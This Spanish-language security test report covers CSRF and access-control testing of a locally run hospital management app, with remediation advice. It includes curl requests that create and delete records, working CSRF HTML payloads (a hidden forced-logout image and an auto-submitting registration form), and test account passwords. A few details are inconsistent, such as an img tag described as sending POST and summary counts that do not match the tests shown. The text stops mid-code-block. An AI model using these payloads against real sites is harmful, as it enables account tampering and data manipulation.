# REPORTE DE PRUEBAS DE SEGURIDAD: CSRF Y BROKEN ACCESS CONTROL

**Proyecto:** Sistema de Gestión Hospitalaria (SUT)  
**Herramientas:** curl, sqlmap 1.10.7, docker  
**Fecha de Ejecución:** 25 de Julio de 2026  
**Servidor:** ASP.NET Core 8.0 en Docker (http://localhost:5076)  
**Base de Datos:** Microsoft SQL Server 2022  

---

## 1. RESUMEN EJECUTIVO

Se realizaron pruebas de seguridad enfocadas en dos categorías del OWASP Top 10:

- **A01:2021 - Broken Access Control** — Acceso no autorizado a datos y funcionalidades.
- **A08:2021 - Software and Data Integrity Failures (CSRF)** — Ausencia de tokens anti-forgery en operaciones de estado.

### Hallazgos Globales

| Categoría | Pruebas Ejecutadas | Vulnerabilidades Confirmadas | Críticas | Altas | Protegidas OK |
|-----------|--------------------|-----------------------------|----------|-------|---------------|
| Broken Access Control | 16 | 7 | 6 | 0 | 9 |
| CSRF | 13 | 8 | 7 | 1 | 0 |
| Privilege Escalation | 4 | 1 | 0 | 1 | 3 |
| Information Disclosure | 2 | 2 | 0 | 2 | 0 |
| **TOTAL** | **35** | **18** | **13** | **4** | **12** |

---

## 2. CREDENCIALES UTILIZADAS EN LAS PRUEBAS

| Usuario | Correo | Contraseña | Rol | Hash SHA-256 |
|---------|--------|------------|-----|--------------|
| Admin | admin@hospital.com | Admin123! | Admin | `3eb3fe66...` |
| Usuario | usuario@hospital.com | Usuario123! | Usuario | `7b206fb8...` |
| Secretario | secretario@hospital.com | Secretario123! | Secretario | `a1ff63e0...` |

> **Nota:** Las contraseñas fueron obtenidas por cracks de rainbow table sobre los hashes SHA-256 almacenados en `init.sql`, demostrando la vulnerabilidad de usar SHA-256 sin salt.

---

## 3. FASE 1: BROKEN ACCESS CONTROL (SIN AUTENTICACIÓN)

### Prueba 1.1 — Listar Médicos sin Login

- **ID:** `SEC-AC-001`
- **Endpoint:** `GET /Medicos/ListarMedicos`
- **Descripción:** Se envía una solicitud HTTP GET al endpoint que retorna el listado de médicos, sin incluir cookie de sesión ni credenciales de autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" http://localhost:5076/Medicos/ListarMedicos
  ```
- **Resultado Esperado:** HTTP 302 (redirect a login) o HTTP 401/403.
- **Resultado Obtenido:** HTTP 302 — Redirige a `/Acceso/Login?ReturnUrl=%2FMedicos%2FListarMedicos`.
- **Severidad:** OK (Protegido)
- **Nota:** El atributo `[Authorize(Roles = "Admin")]` en la clase `MedicosController` protege tanto la vista Razor como los métodos API. La tubería de autenticación de ASP.NET Core intercepta la petición antes de llegar al controlador.

---

### Prueba 1.2 — Listar Pacientes sin Login

- **ID:** `SEC-AC-002`
- **Endpoint:** `GET /Pacientes/ListarPacientes`
- **Descripción:** Se accede al listado de pacientes (datos PHI — Protected Health Information) sin autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" http://localhost:5076/Pacientes/ListarPacientes
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 302 — Redirige a `/Acceso/Login`.
- **Severidad:** OK (Protegido)
- **Nota:** El atributo `[Authorize(Roles = "Admin, Usuario")]` en `PacientesController` protege correctamente el endpoint.

---

### Prueba 1.3 — Listar Citas Médicas sin Login

- **ID:** `SEC-AC-003`
- **Endpoint:** `GET /Home/ListarCitas`
- **Descripción:** Se accede al endpoint de citas médicas desde el controlador `HomeController`, que no tiene atributo `[Authorize]`.
- **Comando:**
  ```bash
  curl -s http://localhost:5076/Home/ListarCitas
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 200 — Retorna `[]` (JSON válido).
- **Severidad:** CRITICAL
- **Vulnerabilidad:** El método `ListarCitas()` en `HomeController.cs:33` expone datos médicos sensibles (citas de pacientes con médicos asignados) sin ninguna forma de autenticación. Cualquier persona en la red puede consultar las citas.

---

### Prueba 1.4 — Obtener IDs de Usuarios sin Login

- **ID:** `SEC-AC-004`
- **Endpoint:** `GET /Generic/obtenerClaves/?tabla=Usuarios`
- **Descripción:** Se utiliza el endpoint genérico de obtención de claves primarias para enumerar los IDs de la tabla de usuarios.
- **Comando:**
  ```bash
  curl -s "http://localhost:5076/Generic/obtenerClaves/?tabla=Usuarios"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 200 — Retorna `[1,2,3]`.
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Un atacante puede enumerar todos los IDs de usuarios registrados sin autenticación. Esto facilita ataques de fuerza bruta dirigidos yenumeración de cuentas. El controlador `GenericController` no tiene atributo `[Authorize]`.

---

### Prueba 1.5 — Obtener IDs de Pacientes sin Login

- **ID:** `SEC-AC-005`
- **Endpoint:** `GET /Generic/obtenerClaves/?tabla=Pacientes`
- **Descripción:** Se enumera la tabla de pacientes a través del endpoint genérico sin autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" "http://localhost:5076/Generic/obtenerClaves/?tabla=Pacientes"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 200 — Retorna `[1,2,...,201]` (201 IDs de pacientes expuestos).
- **Severidad:** CRITICAL
- **Vulnerabilidad:** El endpoint `GenericController` no tiene `[Authorize]`, permitiendo enumerar todos los IDs de pacientes de la base de datos.

---

### Prueba 1.6 — Obtener IDs de Medicos sin Login

- **ID:** `SEC-AC-006`
- **Endpoint:** `GET /Generic/obtenerClaves/?tabla=Medicos`
- **Descripción:** Se enumera la tabla de médicos a través del endpoint genérico sin autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" "http://localhost:5076/Generic/obtenerClaves/?tabla=Medicos"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 200 — Retorna lista de IDs (endpoint accesible sin auth).
- **Severidad:** CRITICAL
- **Vulnerabilidad:** El endpoint `GenericController` expone los IDs de médicos a cualquier usuario anónimo.

---

### Prueba 1.7 — Obtener IDs de Citas sin Login

- **ID:** `SEC-AC-007`
- **Endpoint:** `GET /Generic/obtenerClaves/?tabla=Citas`
- **Descripción:** Se enumera la tabla de citas médicas a través del endpoint genérico sin autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" "http://localhost:5076/Generic/obtenerClaves/?tabla=Citas"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 200 — Retorna lista de IDs.
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Datos médicos expuestos sin autenticación a través de `GenericController`.

---

### Prueba 1.8 — Obtener IDs de Facturación sin Login

- **ID:** `SEC-AC-008`
- **Endpoint:** `GET /Generic/obtenerClaves/?tabla=Facturacion`
- **Descripción:** Se enumera la tabla de facturación hospitalaria a través del endpoint genérico sin autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" "http://localhost:5076/Generic/obtenerClaves/?tabla=Facturacion"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 200 — Retorna lista de IDs.
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Datos financieros hospitalarios expuestos sin autenticación a través de `GenericController`.

---

### Prueba 1.9 — Acceder a Página de Médicos (Vista Razor)

- **ID:** `SEC-AC-009`
- **Endpoint:** `GET /Medicos/Index`
- **Descripción:** Se accede a la vista Razor de gestión de médicos sin autenticación.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" http://localhost:5076/Medicos/Index
  ```
- **Resultado Esperado:** HTTP 302 (redirect a login).
- **Resultado Obtenido:** HTTP 302 — Redirige a `/Acceso/Login`.
- **Severidad:** OK (Protegido)
- **Nota:** El atributo `[Authorize(Roles = "Admin")]` en la clase `MedicosController` bloquea correctamente el acceso a la vista Razor. Sin embargo, los métodos API dentro del mismo controlador son accesibles directamente (ver Prueba 1.1).

---

### Prueba 1.10 — Acceder a Página de Pacientes (Vista Razor)

- **ID:** `SEC-AC-010`
- **Endpoint:** `GET /Pacientes/Index`
- **Descripción:** Se accede a la vista Razor de gestión de pacientes sin autenticación.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" http://localhost:5076/Pacientes/Index
  ```
- **Resultado Esperado:** HTTP 302 (redirect a login).
- **Resultado Obtenido:** HTTP 302 — Redirige a `/Acceso/Login`.
- **Severidad:** OK (Protegido)

---

### Prueba 1.11 — Acceder a Páginas de Citas, Facturación, Tratamientos, Especialidades

- **ID:** `SEC-AC-011`
- **Endpoints:** `/Citas/Citas`, `/Facturacion/Index`, `/Tratamientos/Index`, `/Especialidades/Index`
- **Descripción:** Se verifica el acceso a todas las vistas protegidas sin autenticación.
- **Comando:**
  ```bash
  for ctrl in Citas/Citas Facturacion/Index Tratamientos/Index Especialidades/Index; do
    curl -s -o /dev/null -w "GET /$ctrl → HTTP %{http_code}\n" http://localhost:5076/$ctrl
  done
  ```
- **Resultado Esperado:** Todos retornan HTTP 302.
- **Resultado Obtenido:** Todos retornan HTTP 302 — Protegidos correctamente por `[Authorize]`.
- **Severidad:** OK (Protegido)

---

### Prueba 1.12 — Filtrar Médicos sin Login

- **ID:** `SEC-AC-012`
- **Endpoint:** `GET /Medicos/FiltrarMedicos?nombre=test&apellido=test&especialidadId=1`
- **Descripción:** Se utiliza el endpoint de filtrado de médicos sin autenticación.
- **Comando:**
  ```bash
  curl -s -w "\nHTTP: %{http_code}" "http://localhost:5076/Medicos/FiltrarMedicos?nombre=test&apellido=test&especialidadId=1&telefono=&email="
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 302 — Redirige a `/Acceso/Login`.
- **Severidad:** OK (Protegido)
- **Nota:** El atributo `[Authorize(Roles = "Admin")]` en `MedicosController` protege correctamente el endpoint de filtrado.

---

### Prueba 1.13 — Llamar RevisarPermisos

- **ID:** `SEC-AC-013`
- **Endpoint:** `GET /Acceso/RevisarPermisos`
- **Descripción:** Se invoca el método `RevisarPermisos()` del `AccesoController`, que es un endpoint público que retorna un booleano indicando si el usuario tiene rol Admin.
- **Comando:**
  ```bash
  curl -s http://localhost:5076/Acceso/RevisarPermisos
  ```
- **Resultado Esperado:** El método no debería ser accesible vía HTTP.
- **Resultado Obtenido:** HTTP 200 — Retorna `false`.
- **Severidad:** MEDIUM
- **Vulnerabilidad:** El método `RevisarPermisos()` es `public` y se expone como endpoint HTTP. Un atacante puede usarlo para verificar si ciertos usuarios tienen rol Admin. Además, el método nunca es llamado internamente (código muerto).

---

## 4. FASE 2: CSRF (CROSS-SITE REQUEST FORGERY)

### Prueba 2.1 — Login y Obtención de Cookie de Sesión

- **ID:** `SEC-CSRF-000`
- **Endpoint:** `POST /Acceso/Login`
- **Descripción:** Se inicia sesión como Admin para obtener la cookie de autenticación necesaria para las pruebas CSRF.
- **Comando:**
  ```bash
  curl -v -c /tmp/cookies.txt -X POST http://localhost:5076/Acceso/Login \
    -d "correo=admin@hospital.com&clave=Admin123!"
  ```
- **Resultado Obtenido:** HTTP 302 redirect a `/Home/Index` con cookie `UsuarioLogin` establecida.
- **Nota:** Se confirma que el formulario de login no tiene `@Html.AntiForgeryToken()` y el controlador no tiene `[ValidateAntiForgeryToken]`.

---

### Prueba 2.2 — Crear Médico vía GET sin Token CSRF

- **ID:** `SEC-CSRF-001`
- **Endpoint:** `GET /Medicos/GuardarMedico?id=0&nombre=HACK&apellido=MEDICO&especialidadId=1&telefono=000&email=hack@csrf.com`
- **Descripción:** Se envía una solicitud GET al endpoint de guardado de médicos, simulando un ataque CSRF donde una página maliciosa incluiría una imagen o enlace con esta URL.
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt \
    "http://localhost:5076/Medicos/GuardarMedico?id=0&nombre=HACK&apellido=MEDICO&especialidadId=1&telefono=000&email=hack@csrf.com"
  ```
- **Resultado Esperado:** HTTP 405 (Method Not Allowed) o rechazo por falta de token anti-forgery.
- **Resultado Obtenido:** Retorna `1` — El médico fue creado exitosamente en la base de datos.
- **Verificación:**
  ```bash
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Medicos/ListarMedicos"
  # Resultado: [{"id":2,"nombre":"HACK","apellido":"MEDICO","especialidadId":1,...}]
  ```
- **Severidad:** CRITICAL
- **Vulnerabilidad:** El método `GuardarMedico()` en `MedicosController` no tiene `[HttpPost]`, `[ValidateAntiForgeryToken]`, ni `ModelState.IsValid`. Acepta peticiones GET y procesa datos sin verificación de integridad.

---

### Prueba 2.3 — Crear Paciente vía GET sin Token CSRF

- **ID:** `SEC-CSRF-002`
- **Endpoint:** `GET /Pacientes/GuardarPaciente?id=0&nombre=HACK&apellido=PACIENTE&...`
- **Descripción:** Se crea un paciente malicioso mediante una petición GET sin token CSRF, simulando un ataque desde un sitio externo.
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt \
    "http://localhost:5076/Pacientes/GuardarPaciente?id=0&nombre=HACK&apellido=PACIENTE&fechaNacimiento=2000-01-01&telefono=000&email=hack@csrf.com&direccion=Fake+Street"
  ```
- **Resultado Esperado:** HTTP 405 o rechazo.
- **Resultado Obtenido:** Retorna `1` — Paciente creado.
- **Verificación:**
  ```bash
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Pacientes/ListarPacientes"
  # Resultado: [{"id":1,"nombre":"HACK","apellido":"PACIENTE","direccion":"Fake Street",...}]
  ```
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Datos de paciente (PHI) insertados vía GET sin ninguna verificación de integridad o anti-forgery. Un atacante podría insertar registros falsos en el sistema hospitalario.

---

### Prueba 2.4 — Crear Especialidad vía GET sin Token CSRF

- **ID:** `SEC-CSRF-003`
- **Endpoint:** `GET /Especialidades/GuardarEspecialidad?id=0&nombre=HACK_ESPECIALIDAD`
- **Descripción:** Se inserta una especialidad médica falsa mediante petición GET.
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt \
    "http://localhost:5076/Especialidades/GuardarEspecialidad?id=0&nombre=HACK_ESPECIALIDAD"
  ```
- **Resultado Esperado:** HTTP 405 o rechazo.
- **Resultado Obtenido:** Retorna `1` — Especialidad creada.
- **Verificación:**
  ```bash
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Especialidades/ListarEspecialidades"
  # Resultado: [{"id":1,"nombre":"HACK_ESPECIALIDAD"}]
  ```
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Catálogo de especialidades médicas manipulable por cualquier usuario autenticado vía GET.

---

### Prueba 2.5 — Crear Tratamiento vía GET sin Token CSRF

- **ID:** `SEC-CSRF-004`
- **Endpoint:** `GET /Tratamientos/GuardarTratamiento?id=0&pacienteId=1&descripcion=HACK_Tratamiento&fecha=2026-01-01&costo=999.99`
- **Descripción:** Se inserta un tratamiento médico falso con costo de $999.99.
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt \
    "http://localhost:5076/Tratamientos/GuardarTratamiento?id=0&pacienteId=1&descripcion=HACK_Tratamiento&fecha=2026-01-01&costo=999.99"
  ```
- **Resultado Esperado:** HTTP 405 o rechazo.
- **Resultado Obtenido:** Retorna `1` — Tratamiento creado.
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Registros de tratamiento médico (diagnósticos, costos) manipulables vía GET. Un atacante podría alterar el historial médico de un paciente.

---

### Prueba 2.6 — Crear Factura vía GET sin Token CSRF

- **ID:** `SEC-CSRF-005`
- **Endpoint:** `GET /Facturacion/GuardarFacturacion?id=0&pacienteId=1&monto=9999.99&metodoPago=HACK&fechaPago=2026-01-01`
- **Descripción:** Se inserta una factura hospitalaria con monto de $9,999.99.
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt \
    "http://localhost:5076/Facturacion/GuardarFacturacion?id=0&pacienteId=1&monto=9999.99&metodoPago=HACK&fechaPago=2026-01-01"
  ```
- **Resultado Esperado:** HTTP 405 o rechazo.
- **Resultado Obtenido:** Retorna `1` — Factura creada.
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Registros de facturación hospitalaria manipulables vía GET. Riesgo de fraude financiero y corrupción de datos contables.

---

### Prueba 2.7 — Eliminar Médico vía GET sin Token CSRF

- **ID:** `SEC-CSRF-006`
- **Endpoint:** `GET /Medicos/EliminarMedico?id=1`
- **Descripción:** Se elimina un registro de médico mediante petición GET.
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Medicos/EliminarMedico?id=1"
  ```
- **Resultado Esperado:** HTTP 405 o rechazo.
- **Resultado Obtenido:** Retorna `1` — Médico eliminado.
- **Severidad:** CRITICAL
- **Vulnerabilidad:** Un atacante podría eliminar todos los registros de médicos con una simple URL. Un tag `<img>` en un email o página web ejecutaría la eliminación.

---

### Prueba 2.8 — Eliminar Especialidad vía GET sin Token CSRF

- **ID:** `SEC-CSRF-007`
- **Endpoint:** `GET /Especialidades/EliminarEspecialidad?id=1`
- **Descripción:** Se intenta eliminar una especialidad que tiene médicos asociados (FK constraint).
- **Comando:**
  ```bash
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Especialidades/EliminarEspecialidad?id=1"
  ```
- **Resultado Esperado:** HTTP 405 o rechazo por falta de token.
- **Resultado Obtenido:** Error 500 con **stack trace completo expuesto**:
  ```
  System.Exception: Error al eliminar especialidad: The DELETE statement conflicted
  with the REFERENCE constraint "FK_Medico_Especialidad"...
     at CapaDatos.EspecialidadesDAL.EliminarEspecialidad(Int32 id)
     in /src/Login/CapaDatos/EspecialidadesDAL.cs:line 113
  ```
  Nota: Si el ID no tiene dependencias (ej: `id=999`), retorna `1` sin error.
- **Severidad:** HIGH
- **Vulnerabilidad:** Además de la ausencia de protección CSRF, el error expone la estructura interna del proyecto, facilitando ataques de reconocimiento.

---

### Prueba 2.9 — HTML CSRF — Ataque de Logout Forzado

- **ID:** `SEC-CSRF-008`
- **Descripción:** Se crea un archivo HTML malicioso que fuerza el cierre de sesión de un usuario autenticado.
- **Payload HTML:**
  ```html
  <!DOCTYPE html>
  <html>
  <body>
    <h1>Ganaste un premio!</h1>
    <!-- El usuario hace clic pensando que es legítimo -->
    <img src="http://localhost:5076/Acceso/Logout" style="display:none">
  </body>
  </html>
  ```
- **Mecanismo:** El tag `<img>` envía una petición POST al endpoint de logout. Como no hay token anti-forgery, la sesión se cierra silenciosamente.
- **Severidad:** CRITICAL (Confirmado por código: `AccesoController.cs:94` no tiene `[ValidateAntiForgeryToken]`)

---

### Prueba 2.10 — HTML CSRF — Auto-submit de Registro

- **ID:** `SEC-CSRF-009`
- **Descripción:** Se crea un formulario HTML que se envía automáticamente para registrar un usuario no autorizado.
- **Payload HTML:**
  ```html
  <!DOCTYPE html>
  <html>
  <body>
    <form id="csrf-form" method="post" action="http://localhost:5076/Acceso/Registrar">
      <input type="hidden" name="correo" value="attacker@evil.com">
      <input type="hidden" name="clave" value="Password123!">
      <input type="hidden" name="confClave" value="Password123!">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
  </html>
  ```
- **Mecanismo:** El formulario se envía automáticamente al cargar la página. Como no hay `@Html.AntiForgeryToken()` en el formulario de registro ni `[ValidateAntiForgeryToken]` en el controlador, la cuenta se crea sin consentimiento del usuario.
- **Severidad:** CRITICAL (Confirmado por código: `AccesoController.cs:30` no tiene `[ValidateAntiForgeryToken]`)

---

## 5. FASE 3: VERIFICACIÓN DE CONTROL POR ROLES

### Prueba 3.1 — Login como Usuario Normal

- **ID:** `SEC-ROLE-001`
- **Endpoint:** `POST /Acceso/Login`
- **Descripción:** Se inicia sesión con la cuenta `usuario@hospital.com` (rol: Usuario) para obtener una cookie de sesión válida.
- **Comando:**
  ```bash
  curl -v -c /tmp/cookies_user.txt -X POST http://localhost:5076/Acceso/Login \
    -d "correo=usuario@hospital.com&clave=Usuario123!"
  ```
- **Resultado Obtenido:** HTTP 302 redirect a `/Home/Index` con cookie `UsuarioLogin` establecida.

---

### Prueba 3.2 — Usuario → Acceder a Medicos (Solo Admin)

- **ID:** `SEC-ROLE-002`
- **Endpoint:** `GET /Medicos/Index`
- **Descripción:** Un usuario con rol "Usuario" intenta acceder a la página de gestión de médicos (requiere rol "Admin").
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_user.txt http://localhost:5076/Medicos/Index
  ```
- **Resultado Esperado:** HTTP 302 (redirect a Denegado).
- **Resultado Obtenido:** HTTP 302 — Bloqueado correctamente.
- **Severidad:** OK (Protegido)

---

### Prueba 3.3 — Usuario → Eliminar Médico

- **ID:** `SEC-ROLE-003`
- **Endpoint:** `GET /Medicos/EliminarMedico?id=1`
- **Descripción:** Un usuario con rol "Usuario" intenta eliminar un médico.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_user.txt "http://localhost:5076/Medicos/EliminarMedico?id=1"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 302 — Bloqueado correctamente por `[Authorize(Roles = "Admin")]`.
- **Severidad:** OK (Protegido)

---

### Prueba 3.4 — Usuario → Crear Médico

- **ID:** `SEC-ROLE-004`
- **Endpoint:** `GET /Medicos/GuardarMedico?...`
- **Descripción:** Un usuario con rol "Usuario" intenta crear un médico.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_user.txt \
    "http://localhost:5076/Medicos/GuardarMedico?id=0&nombre=HACK&apellido=USER&especialidadId=1&telefono=000&email=h@x.com"
  ```
- **Resultado Esperado:** HTTP 302 o HTTP 403.
- **Resultado Obtenido:** HTTP 302 — Bloqueado correctamente.
- **Severidad:** OK (Protegido)

---

### Prueba 3.5 — Usuario → Acceder a Pacientes (Permitido)

- **ID:** `SEC-ROLE-005`
- **Endpoint:** `GET /Pacientes/Index`
- **Descripción:** Un usuario con rol "Usuario" accede a la página de pacientes (permitido para rol "Admin" y "Usuario").
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_user.txt http://localhost:5076/Pacientes/Index
  ```
- **Resultado Esperado:** HTTP 200.
- **Resultado Obtenido:** HTTP 200 — Acceso permitido.
- **Severidad:** OK (Comportamiento esperado)

---

### Prueba 3.6 — Usuario → Eliminar Paciente (Privilege Escalation)

- **ID:** `SEC-ROLE-006`
- **Endpoint:** `GET /Pacientes/EliminarPaciente?id=1`
- **Descripción:** Un usuario con rol "Usuario" intenta eliminar un paciente. El controlador tiene `[Authorize(Roles = "Admin, Usuario")]`, lo que permite ambas operaciones CRUD.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_user.txt "http://localhost:5076/Pacientes/EliminarPaciente?id=1"
  ```
- **Resultado Esperado:** HTTP 302 (solo Admin debería poder eliminar).
- **Resultado Obtenido:** HTTP 200 — La petición fue aceptada por el controller.
- **Severidad:** HIGH
- **Vulnerabilidad:** El rol "Usuario" tiene permisos de eliminación sobre datos de pacientes. El atributo `[Authorize(Roles = "Admin, Usuario")]` en `PacientesController.cs:8` no distingue entre operaciones de lectura y escritura. Cualquier usuario puede borrar historiales médicos.

---

### Prueba 3.7 — Secretario → Acceder a Medicos (Bloqueado)

- **ID:** `SEC-ROLE-007`
- **Endpoint:** `GET /Medicos/Index`
- **Descripción:** Un usuario con rol "Secretario" intenta acceder a la página de médicos.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_sec.txt http://localhost:5076/Medicos/Index
  ```
- **Resultado Esperado:** HTTP 302.
- **Resultado Obtenido:** HTTP 302 — Bloqueado correctamente.
- **Severidad:** OK (Protegido)

---

### Prueba 3.8 — Secretario → Crear Médico (Bloqueado)

- **ID:** `SEC-ROLE-008`
- **Endpoint:** `GET /Medicos/GuardarMedico?...`
- **Descripción:** Un usuario con rol "Secretario" intenta crear un médico.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_sec.txt \
    "http://localhost:5076/Medicos/GuardarMedico?id=0&nombre=HACK&Apellido=SEC&EspecialidadId=1&Telefono=000&Email=h@x.com"
  ```
- **Resultado Esperado:** HTTP 302.
- **Resultado Obtenido:** HTTP 302 — Bloqueado correctamente.
- **Severidad:** OK (Protegido)

---

### Prueba 3.9 — Secretario → Acceder a Pacientes (Bloqueado)

- **ID:** `SEC-ROLE-009`
- **Endpoint:** `GET /Pacientes/Index`
- **Descripción:** Un usuario con rol "Secretario" intenta acceder a la página de pacientes.
- **Comando:**
  ```bash
  curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_sec.txt http://localhost:5076/Pacientes/Index
  ```
- **Resultado Esperado:** HTTP 302.
- **Resultado Obtenido:** HTTP 302 — Bloqueado correctamente.
- **Severidad:** OK (Protegido)

---

## 6. PRUEBAS ADICIONALES DE INFORMACIÓN

### Prueba 6.1 — Enumeración de Usuarios sin Autenticación

- **ID:** `SEC-INF-001`
- **Endpoint:** `GET /Generic/obtenerClaves/?tabla=Usuarios`
- **Descripción:** Se verifica que los IDs de usuarios son expuestos a usuarios anónimos.
- **Comando:**
  ```bash
  curl -s "http://localhost:5076/Generic/obtenerClaves/?tabla=Usuarios"
  ```
- **Resultado Obtenido:** `[1,2,3]` — Tres usuarios enumerados.
- **Severidad:** CRITICAL

---

### Prueba 6.2 — Stack Trace en Respuestas de Error

- **ID:** `SEC-INF-002`
- **Endpoint:** `GET /Especialidades/EliminarEspecialidad?id=1` (id con médicos asociados)
- **Descripción:** Se provoca un error de foreign key constraint para verificar si se expone información interna del servidor.
- **Comando:**
  ```bash
  # ID inexistente → retorna 1 sin error
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Especialidades/EliminarEspecialidad?id=999"
  # Output: 1

  # ID con médicos asociados → provoca error de FK
  curl -s -b /tmp/cookies.txt "http://localhost:5076/Especialidades/EliminarEspecialidad?id=1"
  ```
- **Resultado Obtenido:**
  - `id=999` (no existe): retorna `1` — No se expone nada.
  - `id=1` (tiene médicos): **Stack trace completo expuesto:**
    ```
    System.Exception: Error al eliminar especialidad: The DELETE statement conflicted
    with the REFERENCE constraint "FK_Medico_Especialidad"...
       at CapaDatos.EspecialidadesDAL.EliminarEspecialidad(Int32 id)
       in /src/Login/CapaDatos/EspecialidadesDAL.cs:line 113
    ```
- **Severidad:** HIGH
- **Vulnerabilidad:** El stack trace revela la estructura del proyecto (`/src/Login/CapaDatos/EspecialidadesDAL.cs:line 113`), nombres de tablas y constraints de la base de datos. Esto facilita ataques de reconocimiento. En producción, `DeveloperExceptionPageMiddleware` no debería estar habilitado.

---

## 7. TABLA RESUMEN DE VULNERABILIDADES CONFIRMADAS

| ID | Categoría | Vulnerabilidad | Severidad | Archivo Fuente | Línea |
|----|-----------|----------------|-----------|----------------|-------|
| SEC-AC-003 | Broken Access Control | Datos médicos (citas) expuestos sin auth | CRITICAL | `HomeController.cs` | 33 |
| SEC-AC-004 | Broken Access Control | Enumeración de IDs de usuarios sin auth | CRITICAL | `GenericController.cs` | 13 |
| SEC-AC-005 | Broken Access Control | Enumeración de IDs de pacientes sin auth | CRITICAL | `GenericController.cs` | 13 |
| SEC-AC-006 | Broken Access Control | Enumeración de IDs de médicos sin auth | CRITICAL | `GenericController.cs` | 13 |
| SEC-AC-007 | Broken Access Control | Enumeración de IDs de citas sin auth | CRITICAL | `GenericController.cs` | 13 |
| SEC-AC-008 | Broken Access Control | Enumeración de IDs de facturación sin auth | CRITICAL | `GenericController.cs` | 13 |
| SEC-CSRF-001 | CSRF | Crear médico vía GET sin token | CRITICAL | `MedicosController.cs` | 22 |
| SEC-CSRF-002 | CSRF | Crear paciente vía GET sin token | CRITICAL | `PacientesController.cs` | 22 |
| SEC-CSRF-003 | CSRF | Crear especialidad vía GET sin token | CRITICAL | `EspecialidadesController.cs` | 21 |
| SEC-CSRF-004 | CSRF | Crear tratamiento vía GET sin token | CRITICAL | `TratamientosController.cs` | 22 |
| SEC-CSRF-005 | CSRF | Crear factura vía GET sin token | CRITICAL | `FacturacionController.cs` | 21 |
| SEC-CSRF-006 | CSRF | Eliminar médico vía GET sin token | CRITICAL | `MedicosController.cs` | 28 |
| SEC-CSRF-008 | CSRF | Logout forzado vía HTML | CRITICAL | `AccesoController.cs` | 94 |
| SEC-CSRF-007 | CSRF | Stack trace expuesto en error de eliminación | HIGH | `EspecialidadesDAL.cs` | 113 |
| SEC-ROLE-006 | Privilege Escalation | Usuario normal elimina pacientes | HIGH | `PacientesController.cs` | 8 |
| SEC-INF-002 | Information Disclosure | Stack trace completo en errores 500 | HIGH | `EspecialidadesDAL.cs` | 113 |
| SEC-AC-013 | Information Disclosure | RevisarPermisos() expuesto como endpoint público | MEDIUM | `AccesoController.cs` | 103 |

---

## 8. RECOMENDACIONES DE REMEDIACIÓN

### 8.1 — Protección CSRF (Prioridad: CRITICAL)

1. Agregar `[ValidateAntiForgeryToken]` a todas las acciones `[HttpPost]` de todos los controladores.
2. Agregar `@Html.AntiForgeryToken()` o `<input asp-anti-forgery />` en todos los formularios Razor.
3. Configurar `[AutoValidateAntiforgeryToken]` globalmente en `Program.cs`:
   ```csharp
   builder.Services.AddControllersWithViews(options =>
   {
       options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
   });
   ```

### 8.2 — Control de Acceso (Prioridad: CRITICAL)

1. Agregar `[Authorize]` a `GenericController` y al método `ListarCitas()` en `HomeController`.
2. Eliminar o hacer `private` el método `RevisarPermisos()` en `AccesoController`.
3. Cambiar los métodos de eliminación y guardado a `[HttpPost]` en todos los controladores.

### 8.3 — Control de Roles por Acción (Prioridad: HIGH)

1. En `PacientesController`, separar las operaciones de lectura y escritura:
   ```csharp
